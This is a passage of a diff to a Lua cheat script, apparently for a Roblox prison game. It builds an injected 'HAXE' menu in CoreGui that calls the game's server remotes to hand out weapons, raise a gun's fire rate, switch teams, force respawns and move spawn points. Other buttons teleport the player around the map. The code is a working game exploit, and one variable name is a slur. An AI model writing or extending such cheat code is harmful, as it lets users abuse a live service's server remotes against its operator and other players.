@@ -1,3 +1,6 @@
+
+
+
 -- Gui to Lua
 -- Version: 3.2
 
@@ -6,210 +9,129 @@
 local HAXE = Instance.new("ScreenGui")
 local HAXE_2 = Instance.new("Frame")
 local maintwo = Instance.new("Frame")
-local BIENVENIDA = Instance.new("TextButton")
-local CLOSEG = Instance.new("TextLabel")
-local FIGHTGUI = Instance.new("TextButton")
+local Buttons = Instance.new("Frame")
+local CLOSEGUI = Instance.new("TextLabel")
 local ANTIABUSERS = Instance.new("TextButton")
-local REJOIN = Instance.new("TextButton")
-local ENDS = Instance.new("TextButton")
-local ANTIABUSERS_2 = Instance.new("TextButton")
-local FirstPage = Instance.new("Frame")
-local Title = Instance.new("TextLabel")
-local SCORPION = Instance.new("TextButton")
+local FIGHTGUI = Instance.new("TextLabel")
 local Subtitle = Instance.new("TextLabel")
+local Subtitle_2 = Instance.new("TextLabel")
+local BLACKLIST = Instance.new("TextButton")
+local END = Instance.new("TextButton")
+local REJOIN = Instance.new("TextButton")
+local OTROS = Instance.new("TextButton")
+local Subtitle_3 = Instance.new("TextLabel")
+local RESPAWN = Instance.new("TextLabel")
+local FirstPage = Instance.new("Frame")
+local PlayerName = Instance.new("TextLabel")
+local SCORPION = Instance.new("TextButton")
+local Subtitle_4 = Instance.new("TextLabel")
 local Text_x = Instance.new("TextLabel")
-local MainImage = Instance.new("ImageLabel")
 local MOSCANEW = Instance.new("TextButton")
 local MOSCAOLD = Instance.new("TextButton")
+local PlayerImage = Instance.new("ImageLabel")
+local SCORPIONBL = Instance.new("TextButton")
+local HECHO = false
 
---Properties:
+--Fight gui:
 
-HAXE.Name = "HAXE"
-HAXE.Parent = game.CoreGui
+player = game.Players.LocalPlayer
 
-HAXE_2.Name = "HAXE"
-HAXE_2.Parent = HAXE
-HAXE_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-HAXE_2.BackgroundTransparency = 1.000
-HAXE_2.Position = UDim2.new(0.005511811, 0, 0.650258541, 0)
-HAXE_2.Size = UDim2.new(0, 404, 0, 276)
-HAXE_2.Active = true
-HAXE_2.Draggable = true
+player:GetMouse().KeyDown:Connect(function(key)
+	if key == "e" and HECHO == false then
+		HECHO = true
+		
+		wait(0.2)
+		-- Gui to Lua
+		-- Version: 3.2
 
-maintwo.Name = "maintwo"
-maintwo.Parent = HAXE_2
-maintwo.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-maintwo.BackgroundTransparency = 0.250
-maintwo.BorderColor3 = Color3.fromRGB(0, 0, 0)
-maintwo.BorderSizePixel = 3
-maintwo.Position = UDim2.new(0.681768894, 0, 0.0152167724, 0)
-maintwo.Size = UDim2.new(0, 128, 0, 271)
+		--Function:
 
-BIENVENIDA.Name = "BIENVENIDA"
-BIENVENIDA.Parent = maintwo
-BIENVENIDA.BackgroundColor3 = Color3.fromRGB(104, 34, 0)
-BIENVENIDA.BorderColor3 = Color3.fromRGB(0, 0, 0)
-BIENVENIDA.Position = UDim2.new(0.0664620399, 0, 0.0197116677, 0)
-BIENVENIDA.Size = UDim2.new(0, 107, 0, 25)
-BIENVENIDA.Font = Enum.Font.SourceSans
-BIENVENIDA.Text = "BENVENIDA"
-BIENVENIDA.TextColor3 = Color3.fromRGB(255, 255, 255)
-BIENVENIDA.TextSize = 14.000
+		local function getGuns()
+			--M4A1----------------------------------------------------
+			if (game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 96651)) then
+				game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
+			else --If you don't have gamepass for M4A1 then you will get the converted AK-47
+				game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP) 
+				require(game.Players.LocalPlayer.Backpack:FindFirstChild("AK-47"):FindFirstChild("GunStates"))["FireRate"] = 0.09
+			end
+			----------------------------------------------------------
+			--Remington870--------------------------------------------
+			game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP) --Remington 870
 
-CLOSEG.Name = "CLOSEG"
-CLOSEG.Parent = maintwo
-CLOSEG.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-CLOSEG.BackgroundTransparency = 0.500
-CLOSEG.BorderColor3 = Color3.fromRGB(0, 0, 0)
-CLOSEG.Position = UDim2.new(0.0674871206, 0, 0.144643515, 0)
-CLOSEG.Size = UDim2.new(0, 107, 0, 24)
-CLOSEG.Font = Enum.Font.SourceSans
-CLOSEG.Text = "CLOSE GUI (Q)"
-CLOSEG.TextColor3 = Color3.fromRGB(255, 255, 255)
-CLOSEG.TextSize = 14.000
 
-FIGHTGUI.Name = "FIGHT GUI"
-FIGHTGUI.Parent = maintwo
-FIGHTGUI.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-FIGHTGUI.BorderColor3 = Color3.fromRGB(0, 0, 0)
-FIGHTGUI.Position = UDim2.new(0.0583255291, 0, 0.262936056, 0)
-FIGHTGUI.Size = UDim2.new(0, 107, 0, 25)
-FIGHTGUI.Font = Enum.Font.SourceSans
-FIGHTGUI.Text = "FIGHT GUI (E)"
-FIGHTGUI.TextColor3 = Color3.fromRGB(255, 255, 255)
-FIGHTGUI.TextSize = 14.000
-FIGHTGUI.MouseButton1Down:connect(function()
-	-- Gui to Lua
-	-- Version: 3.2
+			----------------------------------------------------------
 
-	-- Instances:
+			--AK-47---------------------------------------------------
+			if (game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 96651)) then
+				--If you don't have gamepass for M4A1 then you will not get this AK-47
+				game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
+			end
+			----------------------------------------------------------
 
-	local HAXEFGUI = Instance.new("ScreenGui")
-	local FightGui = Instance.new("Frame")
-	local NAMEGUI = Instance.new("TextLabel")
-	local BACK = Instance.new("TextButton")
-	local RESPAWN = Instance.new("TextButton")
-	local GUNS = Instance.new("TextButton")
-	local REGUNS = Instance.new("TextButton")
-	local NEUTRAL = Instance.new("TextButton")
-	local NOSHIELD = Instance.new("TextLabel")
-	local NEXUS = Instance.new("TextButton")
-	local LOCK = Instance.new("TextButton")
-	local PVPTEXT = Instance.new("TextLabel")
-	local NOSHIELD_2 = Instance.new("TextLabel")
-	local INMATE = Instance.new("TextButton")
-	local GUARD = Instance.new("TextButton")
-	local NOSHIELD_3 = Instance.new("TextLabel")
-	local ROOF = Instance.new("TextButton")
-	local PVPTP = Instance.new("TextButton")
-	local CRIM = Instance.new("TextButton")
-	local ARMORY = Instance.new("TextButton")
-	local YARD = Instance.new("TextButton")
-	local CAFE = Instance.new("TextButton")
-	local CELLS = Instance.new("TextButton")
-	local CRIMT = Instance.new("TextButton")
-
-	--Function:
-
-	local function getGuns()
-		--M4A1----------------------------------------------------
-		if (game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 96651)) then
-			game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
-		else --If you don't have gamepass for M4A1 then you will get the converted AK-47
-			game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP) 
-			require(game.Players.LocalPlayer.Backpack:FindFirstChild("AK-47"):FindFirstChild("GunStates"))["FireRate"] = 0.09
+			--M9---------------------------------------------------
+			game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
+			if game.Players.LocalPlayer:FindFirstChild("M9") then
+				game.Players.LocalPlayer:FindFirstChild("M9").Parent = game.Players.LocalPlayer.Backpack
+			end
+			-------------------------------------------------------
 		end
-		----------------------------------------------------------
-		--Remington870--------------------------------------------
-		game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP) --Remington 870
 
+		-- Instances:
 
-		----------------------------------------------------------
+		local HAXEFGUI = Instance.new("ScreenGui")
+		local FightGui = Instance.new("Frame")
+		local CRIMINAL = Instance.new("TextButton")
+		local BACK = Instance.new("TextButton")
+		local RESPAWN = Instance.new("TextButton")
+		local GUNS = Instance.new("TextButton")
+		local REGUNS = Instance.new("TextButton")
+		local COLOR = Instance.new("TextButton")
+		local CAFE = Instance.new("TextButton")
+		local NEXUS = Instance.new("TextButton")
+		local LOCK = Instance.new("TextButton")
+		local PVPTEXT = Instance.new("TextLabel")
+		local NOSHIELD = Instance.new("TextLabel")
+		local CELLS = Instance.new("TextButton")
+		local NOSHIELD_2 = Instance.new("TextLabel")
+		local ROOF = Instance.new("TextButton")
+		local PVPTP = Instance.new("TextButton")
+		local CRIM = Instance.new("TextButton")
+		local ARMORY = Instance.new("TextButton")
+		local YARD = Instance.new("TextButton")
+		local GUARDS = Instance.new("TextButton")
+		local NEUTRAL = Instance.new("TextButton")
+		local INMATE = Instance.new("TextButton")
+		local NAMEGUI = Instance.new("TextLabel")
 
-		--AK-47---------------------------------------------------
-		if (game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 96651)) then
-			--If you don't have gamepass for M4A1 then you will not get this AK-47
-			game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
-		end
-		----------------------------------------------------------
+		--Properties:
 
-		--M9---------------------------------------------------
-		game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
-		if game.Players.LocalPlayer:FindFirstChild("M9") then
-			game.Players.LocalPlayer:FindFirstChild("M9").Parent = game.Players.LocalPlayer.Backpack
-		end
-		-------------------------------------------------------
-	end
+		HAXEFGUI.Name = "HAXEFGUI"
+		HAXEFGUI.Parent = game.CoreGui
+		HAXEFGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
-	--Properties:
+		FightGui.Name = "FightGui"
+		FightGui.Parent = HAXEFGUI
+		FightGui.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		FightGui.BackgroundTransparency = 0.200
+		FightGui.BorderColor3 = Color3.fromRGB(255, 255, 255)
+		FightGui.BorderSizePixel = 3
+		FightGui.Position = UDim2.new(0.013942752, 0, 0.118401468, 0)
+		FightGui.Size = UDim2.new(0, 267, 0, 372)
+		FightGui.Active = true
+		FightGui.Draggable = true
 
-	HAXEFGUI.Name = "HAXEFGUI"
-	HAXEFGUI.Parent = game.CoreGui
-	HAXEFGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
-	FightGui.Name = "FightGui"
-	FightGui.Parent = HAXEFGUI
-	FightGui.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	FightGui.BackgroundTransparency = 0.250
-	FightGui.BorderColor3 = Color3.fromRGB(177, 177, 177)
-	FightGui.BorderSizePixel = 3
-	FightGui.Position = UDim2.new(0.0710856095, 0, 0.145662934, 0)
-	FightGui.Size = UDim2.new(0, 267, 0, 372)
-	FightGui.Active = true
-	FightGui.Draggable = true
-
-	NAMEGUI.Name = "NAMEGUI"
-	NAMEGUI.Parent = FightGui
-	NAMEGUI.BackgroundColor3 = Color3.fromRGB(11, 11, 18)
-	NAMEGUI.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	NAMEGUI.Position = UDim2.new(0.0413346291, 0, 0.013333505, 0)
-	NAMEGUI.Size = UDim2.new(0, 242, 0, 27)
-	NAMEGUI.Font = Enum.Font.SciFi
-	NAMEGUI.Text = "FIGHT GUI"
-	NAMEGUI.TextColor3 = Color3.fromRGB(255, 255, 255)
-	NAMEGUI.TextScaled = true
-	NAMEGUI.TextSize = 28.000
-	NAMEGUI.TextWrapped = true
-
-	BACK.Name = "BACK"
-	BACK.Parent = FightGui
-	BACK.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	BACK.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	BACK.Position = UDim2.new(0.628451705, 0, 0.342538357, 0)
-	BACK.Size = UDim2.new(0, 63, 0, 25)
-	BACK.Font = Enum.Font.SourceSans
-	BACK.Text = "BACK"
-	BACK.TextColor3 = Color3.fromRGB(255, 255, 255)
-	BACK.TextSize = 14.000
-	BACK.MouseButton1Down:connect(function()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(980, 101, 2327)
-	end)
-
-
-	RESPAWN.Name = "RESPAWN"
-	RESPAWN.Parent = FightGui
-	RESPAWN.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	RESPAWN.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	RESPAWN.Position = UDim2.new(0.0546759367, 0, 0.798638463, 0)
-	RESPAWN.Size = UDim2.new(0, 107, 0, 25)
-	RESPAWN.Font = Enum.Font.SourceSans
-	RESPAWN.Text = "RESPAWN"
-	RESPAWN.TextColor3 = Color3.fromRGB(255, 255, 255)
-	RESPAWN.TextSize = 14.000
-	RESPAWN.MouseButton1Down:connect(function()
-		if (game.Players.LocalPlayer.Team.Name ~= "Criminals") then
+		CRIMINAL.Name = "CRIMINAL"
+		CRIMINAL.Parent = FightGui
+		CRIMINAL.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		CRIMINAL.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		CRIMINAL.Position = UDim2.new(0.25504902, 0, 0.53016752, 0)
+		CRIMINAL.Size = UDim2.new(0, 63, 0, 25)
+		CRIMINAL.Font = Enum.Font.SourceSans
+		CRIMINAL.Text = "CRIMINAL"
+		CRIMINAL.TextColor3 = Color3.fromRGB(255, 255, 255)
+		CRIMINAL.TextSize = 14.000
+		CRIMINAL.MouseButton1Down:connect(function()
 			local lastPos = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
-			local plr = game.Players.LocalPlayer.Name
-			local gayevent = game:GetService("Workspace").Remote.loadchar
-			gayevent:InvokeServer(plr)
-			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(lastPos)
-		else
-			local lastPos = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
-			Workspace.Remote.TeamEvent:FireServer("Bright orange")
-			wait()
-			local plr = game.Players.LocalPlayer.Name
-			local gayevent = game:GetService("Workspace").Remote.loadchar
-			gayevent:InvokeServer(plr)
 			LCS = game.Workspace["Criminals Spawn"].SpawnLocation
 			LCS.CanCollide = false
 			LCS.Size = Vector3.new(51.05, 24.12, 54.76)
@@ -221,72 +143,88 @@ FIGHTGUI.MouseButton1Down:connect(function()
 			LCS.Transparency = 0
 			wait()
 			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(lastPos)
-		end
-	end)
+		end)
 
-	GUNS.Name = "GUNS"
-	GUNS.Parent = FightGui
-	GUNS.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	GUNS.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	GUNS.Position = UDim2.new(0.0546759367, 0, 0.867935181, 0)
-	GUNS.Size = UDim2.new(0, 107, 0, 25)
-	GUNS.Font = Enum.Font.SourceSans
-	GUNS.Text = "GUNS"
-	GUNS.TextColor3 = Color3.fromRGB(255, 255, 255)
-	GUNS.TextSize = 14.000
-	GUNS.MouseButton1Down:connect(function()
-		if game.Players.LocalPlayer.Team.Name == "Criminals" then 
-			if game.Players.LocalPlayer.Character:FindFirstChildOfClass("ForceField") then return end
-		end
-		getGuns()
-	end)
+		BACK.Name = "BACK"
+		BACK.Parent = FightGui
+		BACK.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		BACK.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		BACK.Position = UDim2.new(0.624706388, 0, 0.302215785, 0)
+		BACK.Size = UDim2.new(0, 63, 0, 25)
+		BACK.Font = Enum.Font.SourceSans
+		BACK.Text = "BACK"
+		BACK.TextColor3 = Color3.fromRGB(255, 255, 255)
+		BACK.TextSize = 14.000
+		BACK.MouseButton1Down:connect(function()
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(980, 101, 2327)
+		end)
 
+		RESPAWN.Name = "RESPAWN"
+		RESPAWN.Parent = FightGui
+		RESPAWN.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		RESPAWN.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		RESPAWN.Position = UDim2.new(0.29829967, 0, 0.755462348, 0)
+		RESPAWN.Size = UDim2.new(0, 107, 0, 25)
+		RESPAWN.Font = Enum.Font.SourceSans
+		RESPAWN.Text = "RESPAWN"
+		RESPAWN.TextColor3 = Color3.fromRGB(255, 255, 255)
+		RESPAWN.TextSize = 14.000
+		RESPAWN.MouseButton1Down:connect(function()
+			if (game.Players.LocalPlayer.Team.Name ~= "Criminals") then
+				local lastPos = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
+				local plr = game.Players.LocalPlayer.Name
+				local gayevent = game:GetService("Workspace").Remote.loadchar
+				gayevent:InvokeServer(plr)
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(lastPos)
+			else
+				local lastPos = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
+				Workspace.Remote.TeamEvent:FireServer("Bright orange")
+				wait()
+				local plr = game.Players.LocalPlayer.Name
+				local gayevent = game:GetService("Workspace").Remote.loadchar
+				gayevent:InvokeServer(plr)
+				LCS = game.Workspace["Criminals Spawn"].SpawnLocation
+				LCS.CanCollide = false
+				LCS.Size = Vector3.new(51.05, 24.12, 54.76)
+				LCS.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+				LCS.Transparency = 1
+				wait(0.5)
+				LCS.CFrame = CFrame.new(-920.510803, 92.2271957, 2138.27002, 0, 0, -1, 0, 1, 0, 1, 0, 0)
+				LCS.Size = Vector3.new(6, 0.2, 6)
+				LCS.Transparency = 0
+				wait()
+				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(lastPos)
+			end
+		end)
 
-	REGUNS.Name = "REGUNS"
-	REGUNS.Parent = FightGui
-	REGUNS.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	REGUNS.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	REGUNS.Position = UDim2.new(0.545312643, 0, 0.86507231, 0)
-	REGUNS.Size = UDim2.new(0, 107, 0, 25)
-	REGUNS.Font = Enum.Font.SourceSans
-	REGUNS.Text = "RE-GUNS"
-	REGUNS.TextColor3 = Color3.fromRGB(255, 255, 255)
-	REGUNS.TextSize = 14.000
-	REGUNS.MouseButton1Down:connect(function()
-		if (game.Players.LocalPlayer.Team.Name ~= "Criminals") then
-			local lastPos = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
-			local plr = game.Players.LocalPlayer.Name
-			local gayevent = game:GetService("Workspace").Remote.loadchar
-			gayevent:InvokeServer(plr)
-			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(lastPos)
-		else
-			local lastPos = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
-			Workspace.Remote.TeamEvent:FireServer("Bright orange")
-			wait()
-			local plr = game.Players.LocalPlayer.Name
-			local gayevent = game:GetService("Workspace").Remote.loadchar
-			gayevent:InvokeServer(plr)
-			LCS = game.Workspace["Criminals Spawn"].SpawnLocation
-			LCS.CanCollide = false
-			LCS.Size = Vector3.new(51.05, 24.12, 54.76)
-			LCS.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-			LCS.Transparency = 1
-			wait(0.5)
-			LCS.CFrame = CFrame.new(-920.510803, 92.2271957, 2138.27002, 0, 0, -1, 0, 1, 0, 1, 0, 0)
-			LCS.Size = Vector3.new(6, 0.2, 6)
-			LCS.Transparency = 0
-			wait()
-			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(lastPos)
-		end
-		wait(0.1)
-		if game.Players.LocalPlayer.Team.Name == "Criminals" then 
-			if game.Players.LocalPlayer.Character:FindFirstChildOfClass("ForceField") then return end
-		end
-		getGuns()
-	end)
-	
-	game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(key)
-		if key == "z" then
+		GUNS.Name = "GUNS"
+		GUNS.Parent = FightGui
+		GUNS.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		GUNS.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		GUNS.Position = UDim2.new(0.29829967, 0, 0.822580636, 0)
+		GUNS.Size = UDim2.new(0, 107, 0, 25)
+		GUNS.Font = Enum.Font.SourceSans
+		GUNS.Text = "GUNS"
+		GUNS.TextColor3 = Color3.fromRGB(255, 255, 255)
+		GUNS.TextSize = 14.000
+		GUNS.MouseButton1Down:connect(function()
+			if game.Players.LocalPlayer.Team.Name == "Criminals" then 
+				if game.Players.LocalPlayer.Character:FindFirstChildOfClass("ForceField") then return end
+			end
+			getGuns()
+		end)
+
+		REGUNS.Name = "REGUNS"
+		REGUNS.Parent = FightGui
+		REGUNS.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		REGUNS.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		REGUNS.Position = UDim2.new(0.29829967, 0, 0.889462411, 0)
+		REGUNS.Size = UDim2.new(0, 107, 0, 25)
+		REGUNS.Font = Enum.Font.SourceSans
+		REGUNS.Text = "RE-GUNS (Z)"
+		REGUNS.TextColor3 = Color3.fromRGB(255, 255, 255)
+		REGUNS.TextSize = 14.000
+		REGUNS.MouseButton1Down:connect(function()
 			if (game.Players.LocalPlayer.Team.Name ~= "Criminals") then
 				local lastPos = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
 				local plr = game.Players.LocalPlayer.Name
@@ -317,288 +255,351 @@ FIGHTGUI.MouseButton1Down:connect(function()
 				if game.Players.LocalPlayer.Character:FindFirstChildOfClass("ForceField") then return end
 			end
 			getGuns()
-		end
-	end)
-
-	NEUTRAL.Name = "NEUTRAL"
-	NEUTRAL.Parent = FightGui
-	NEUTRAL.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	NEUTRAL.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	NEUTRAL.Position = UDim2.new(0.265672058, 0, 0.535766542, 0)
-	NEUTRAL.Size = UDim2.new(0, 63, 0, 25)
-	NEUTRAL.Font = Enum.Font.SourceSans
-	NEUTRAL.Text = "NEUTRAL"
-	NEUTRAL.TextColor3 = Color3.fromRGB(255, 255, 255)
-	NEUTRAL.TextSize = 14.000
-	NEUTRAL.MouseButton1Down:connect(function()
-		Workspace.Remote.TeamEvent:FireServer("Medium stone grey")
-	end)
-
-	NOSHIELD.Name = "NOSHIELD"
-	NOSHIELD.Parent = FightGui
-	NOSHIELD.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	NOSHIELD.BackgroundTransparency = 1.000
-	NOSHIELD.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	NOSHIELD.Position = UDim2.new(0.293727756, 0, 0.080667384, 0)
-	NOSHIELD.Size = UDim2.new(0, 107, 0, 24)
-	NOSHIELD.Font = Enum.Font.SourceSans
-	NOSHIELD.Text = "NOSHIELD (G)"
-	NOSHIELD.TextColor3 = Color3.fromRGB(255, 255, 255)
-	NOSHIELD.TextSize = 14.000
-
-	NEXUS.Name = "NEXUS"
-	NEXUS.Parent = FightGui
-	NEXUS.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	NEXUS.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	NEXUS.Position = UDim2.new(0.393012524, 0, 0.344753861, 0)
-	NEXUS.Size = UDim2.new(0, 63, 0, 25)
-	NEXUS.Font = Enum.Font.SourceSans
-	NEXUS.Text = "NEXUS"
-	NEXUS.TextColor3 = Color3.fromRGB(255, 255, 255)
-	NEXUS.TextSize = 14.000
-	NEXUS.MouseButton1Down:connect(function()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(917, 100, 2387)
-	end)
-
-
-	LOCK.Name = "LOCK"
-	LOCK.Parent = FightGui
-	LOCK.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	LOCK.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	LOCK.Position = UDim2.new(0.544803441, 0, 0.793652594, 0)
-	LOCK.Size = UDim2.new(0, 108, 0, 25)
-	LOCK.Font = Enum.Font.SourceSans
-	LOCK.Text = "LOCK"
-	LOCK.TextColor3 = Color3.fromRGB(255, 255, 255)
-	LOCK.TextSize = 14.000
-	LOCK.MouseButton1Down:connect(function()
-		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 24
-		game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = true
-		game.Players.LocalPlayer.CharacterAdded:connect(function()
-			game.Workspace:WaitForChild(game.Players.LocalPlayer.Name)
-			game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = true
 		end)
-	end)
 
-	PVPTEXT.Name = "PVPTEXT"
-	PVPTEXT.Parent = FightGui
-	PVPTEXT.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	PVPTEXT.BackgroundTransparency = 1.000
-	PVPTEXT.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	PVPTEXT.Position = UDim2.new(0.300336361, 0, 0.70946002, 0)
-	PVPTEXT.Size = UDim2.new(0, 107, 0, 24)
-	PVPTEXT.Font = Enum.Font.SourceSans
-	PVPTEXT.Text = "PVP"
-	PVPTEXT.TextColor3 = Color3.fromRGB(255, 255, 255)
-	PVPTEXT.TextSize = 14.000
-
-	NOSHIELD_2.Name = "NOSHIELD"
-	NOSHIELD_2.Parent = FightGui
-	NOSHIELD_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	NOSHIELD_2.BackgroundTransparency = 1.000
-	NOSHIELD_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	NOSHIELD_2.Position = UDim2.new(0.297472954, 0, 0.437586039, 0)
-	NOSHIELD_2.Size = UDim2.new(0, 107, 0, 24)
-	NOSHIELD_2.Font = Enum.Font.SourceSans
-	NOSHIELD_2.Text = "TEAMS"
-	NOSHIELD_2.TextColor3 = Color3.fromRGB(255, 255, 255)
-	NOSHIELD_2.TextSize = 14.000
-
-	INMATE.Name = "INMATE"
-	INMATE.Parent = FightGui
-	INMATE.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	INMATE.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	INMATE.Position = UDim2.new(0.501627445, 0, 0.603240848, 0)
-	INMATE.Size = UDim2.new(0, 63, 0, 25)
-	INMATE.Font = Enum.Font.SourceSans
-	INMATE.Text = "INMATE"
-	INMATE.TextColor3 = Color3.fromRGB(255, 255, 255)
-	INMATE.TextSize = 14.000
-	INMATE.MouseButton1Down:connect(function()
-		Workspace.Remote.TeamEvent:FireServer("Bright orange")
-	end)
-
-	GUARD.Name = "GUARD"
-	GUARD.Parent = FightGui
-	GUARD.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	GUARD.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	GUARD.Position = UDim2.new(0.505372763, 0, 0.535960734, 0)
-	GUARD.Size = UDim2.new(0, 63, 0, 25)
-	GUARD.Font = Enum.Font.SourceSans
-	GUARD.Text = "GUARD"
-	GUARD.TextColor3 = Color3.fromRGB(255, 255, 255)
-	GUARD.TextSize = 14.000
-	GUARD.MouseButton1Down:connect(function()
-		local lastPos = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
-		workspace.Remote.loadchar:InvokeServer("", "Bright blue")
-		wait()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(lastPos)
-	end)
-
-	NOSHIELD_3.Name = "NOSHIELD"
-	NOSHIELD_3.Parent = FightGui
-	NOSHIELD_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	NOSHIELD_3.BackgroundTransparency = 1.000
-	NOSHIELD_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	NOSHIELD_3.Position = UDim2.new(0.289982438, 0, 0.143843353, 0)
-	NOSHIELD_3.Size = UDim2.new(0, 107, 0, 24)
-	NOSHIELD_3.Font = Enum.Font.SourceSans
-	NOSHIELD_3.Text = "TELEPORTS"
-	NOSHIELD_3.TextColor3 = Color3.fromRGB(255, 255, 255)
-	NOSHIELD_3.TextSize = 14.000
-
-	ROOF.Name = "ROOF"
-	ROOF.Parent = FightGui
-	ROOF.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	ROOF.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	ROOF.Position = UDim2.new(0.62896812, 0, 0.207715064, 0)
-	ROOF.Size = UDim2.new(0, 63, 0, 25)
-	ROOF.Font = Enum.Font.SourceSans
-	ROOF.Text = "ROOF"
-	ROOF.TextColor3 = Color3.fromRGB(255, 255, 255)
-	ROOF.TextSize = 14.000
-	ROOF.MouseButton1Down:connect(function()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(848,118,2332)
-	end)
-
-	PVPTP.Name = "PVPTP"
-	PVPTP.Parent = FightGui
-	PVPTP.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	PVPTP.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	PVPTP.Position = UDim2.new(0.628968477, 0, 0.275566489, 0)
-	PVPTP.Size = UDim2.new(0, 63, 0, 25)
-	PVPTP.Font = Enum.Font.SourceSans
-	PVPTP.Text = "PVP"
-	PVPTP.TextColor3 = Color3.fromRGB(255, 255, 255)
-	PVPTP.TextSize = 14.000
-	PVPTP.MouseButton1Down:connect(function()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-770, 11, 1491)
-	end)
-
-	CRIM.Name = "CRIM"
